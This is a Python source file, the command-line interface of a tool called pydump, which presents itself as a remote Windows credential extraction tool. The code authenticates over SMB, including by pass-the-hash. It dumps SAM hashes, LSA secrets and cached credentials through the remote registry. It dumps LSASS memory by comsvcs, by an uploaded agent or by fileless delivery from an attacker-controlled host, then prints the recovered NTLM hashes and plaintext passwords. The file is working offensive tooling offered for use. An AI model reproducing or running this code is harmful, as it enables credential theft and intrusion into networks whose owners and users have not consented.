"""Command-line interface for pydump."""

import argparse
import sys
import os

__version__ = "0.2.0"


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote Windows credential extraction tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
  pydump dump -t 192.168.1.50 -u admin -H aad3b4...ef40 -m registry
  pydump dump -t 192.168.1.50 -u admin -p pass --lhost 10.0.0.5
  pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
  pydump parse -f lsass.dmp
""",
    )
    parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")

    subparsers = parser.add_subparsers(dest="command")

    # ─── dump ───────────────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser("dump", help="Extract credentials from a remote target")
    dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    dump_parser.add_argument("-u", "--username", required=True, help="Username")
    dump_parser.add_argument("-p", "--password", default="", help="Password")
    dump_parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
                             metavar="NTHASH", help="NT hash for pass-the-hash (32 hex chars)")
    dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
    dump_parser.add_argument(
        "-m", "--method",
        choices=["auto", "registry", "comsvcs", "silent", "pipe"],
        default="auto",
        help="Extraction method (default: auto = registry + pipe agent)",
    )
    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
    dump_parser.add_argument("--lhost", default=None, metavar="IP",
                             help="Attacker IP for fileless UNC delivery or silent callback")
    dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
    dump_parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
    dump_parser.add_argument("-o", "--output", default=None, metavar="FILE", help="Save raw LSASS dump to file")

    # ─── parse ──────────────────────────────────────────────────────────────
    parse_parser = subparsers.add_parser("parse", help="Parse an existing LSASS minidump file")
    parse_parser.add_argument("-f", "--file", required=True, metavar="PATH", help="Path to .dmp file")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    # Validate auth
    if args.command == "dump":
        if not args.password and not args.nt_hash:
            print("[!] Error: provide either -p/--password or -H/--hash")
            sys.exit(1)
        if args.nt_hash:
            h = args.nt_hash.lower()
            if len(h) != 32 or not all(c in "0123456789abcdef" for c in h):
                print("[!] Error: --hash must be exactly 32 hex characters")
                sys.exit(1)
            args.nt_hash = h

    if args.command == "dump":
        _cmd_dump(args)
    elif args.command == "parse":
        _cmd_parse(args)


def _cmd_dump(args):
    """Full credential extraction: registry + LSASS."""
    from .smb import SmbSession
    from .dump.methods import ComSvcsDump, SilentDump, PipeDump
    from .secrets.registry import RegistrySecrets

    print(f"[*] Connecting to {args.target}...")

    try:
        with SmbSession(args.target, args.username, args.password, args.domain,
                        nt_hash=args.nt_hash) as session:
            auth_method = "PTH" if args.nt_hash else "password"
            print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")

            do_registry = args.method in ("auto", "registry")
            do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")

            if do_registry:
                _dump_registry(session)

            if do_lsass:
                _dump_lsass(session, args)
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)


def _dump_registry(session):
    """Extract secrets from remote registry."""
    from .secrets.registry import RegistrySecrets

    print()
    print("── Registry Secrets ─────────────────────────────────────────")
    reg_secrets = RegistrySecrets(session)

    # Ensure service is running
    try:
        reg_secrets.ensure_remote_registry()
        print("[+] Remote Registry service ready")
    except Exception as e:
        print(f"[!] Cannot start Remote Registry: {e}")
        return

    try:
        # SAM hashes
        try:
            hashes = reg_secrets.dump_sam()
            if hashes:
                print(f"[+] SAM hashes ({len(hashes)}):")
                for h in hashes:
                    print(f"    {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
            else:
                print("[-] No SAM hashes found")
        except Exception as e:
            print(f"[!] SAM extraction failed: {e}")

        # LSA Secrets
        try:
            secrets = reg_secrets.dump_lsa_secrets()
            if secrets:
                print(f"[+] LSA Secrets ({len(secrets)}):")
                for s in secrets:
                    print(f"    {s.name}: {s.decoded}")
            else:
                print("[-] No LSA secrets found")
        except Exception as e:
            print(f"[!] LSA secrets failed: {e}")

        # Cached creds
        try:
            cached = reg_secrets.dump_cached_creds()
            if cached:
                print(f"[+] Cached credentials ({len(cached)}):")
                for c in cached:
                    print(f"    {c.domain}\\{c.username}:{c.hash_hex}")
            else:
                print("[-] No cached credentials")
        except Exception as e:
            print(f"[!] Cached creds failed: {e}")
    finally:
        reg_secrets.cleanup_remote_registry()
        print("[*] Remote Registry service restored")


def _dump_lsass(session, args):
    """Dump LSASS memory and extract credentials."""
    from .dump.methods import ComSvcsDump, SilentDump, PipeDump

    print()
    print("── LSASS Memory ─────────────────────────────────────────────")

    method_name = args.method if args.method not in ("auto", "registry") else "pipe"

    if method_name == "pipe":
        agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
        if not os.path.isfile(agent_path):
            print(f"[!] Agent not found: {agent_path}")
            print("    Build it with: cd agent && make cross")
            return
        fileless = bool(args.lhost)
        method = PipeDump(session, agent_path, lhost=args.lhost)
        if fileless:
            print(f"[*] Method: pipe (fileless via \\\\{args.lhost})")
        else:
            print("[*] Method: pipe (agent uploaded to ADMIN$/Temp)")
    elif method_name == "comsvcs":
        method = ComSvcsDump(session)
        print("[*] Method: comsvcs")
    elif method_name == "silent":
        if not args.lhost:
            print("[!] --lhost required for silent method")
            return
        method = SilentDump(session, args.lhost)
        print("[*] Method: silent")
    else:
        method = ComSvcsDump(session)
        print(f"[*] Method: {method_name}")

    try:
        if method_name == "silent":
            dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
        else:
            dump_data = method.execute(lsass_pid=args.pid)
    except Exception as e:
        print(f"[!] LSASS dump failed: {e}")
        return

    print(f"[+] Received {len(dump_data)} bytes ({len(dump_data) // 1024 // 1024} MB)")

    if args.output:
        with open(args.output, "wb") as f:
            f.write(dump_data)
        print(f"[+] Saved to {args.output}")

    _parse_and_display(dump_data)


def _cmd_parse(args):
    """Parse a local dump file."""
    from .parser.minidump import parse

    if not os.path.isfile(args.file):
        print(f"[!] File not found: {args.file}")
        sys.exit(1)

    with open(args.file, "rb") as f:
        dump_data = f.read()

    print(f"[*] Parsing {args.file} ({len(dump_data)} bytes)")
    _parse_and_display(dump_data)


def _parse_and_display(dump_data: bytes):
    """Parse dump and display extracted credentials."""
    from .parser.minidump import parse
    from .parser.extract import CredentialExtractor

    print("[*] Parsing minidump...")
    dump = parse(dump_data)

    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")
    print(f"    Modules: {len(dump.modules)}")
    print(f"    Memory segments: {len(dump.memory)}")
    print()

    print("[*] Extracting credentials...")
    extractor = CredentialExtractor(dump)

    try:
        credentials = extractor.extract()
    except Exception as e:
        print(f"[!] {e}")
        return

    if not credentials:
        print("[-] No credentials found")
        return

    print(f"[+] Found {len(credentials)} credential(s):\n")
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)

    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash if cred.ntlm_hash else "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password if cred.password else "(empty)"
        else:
            secret = "(see above)"

        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")


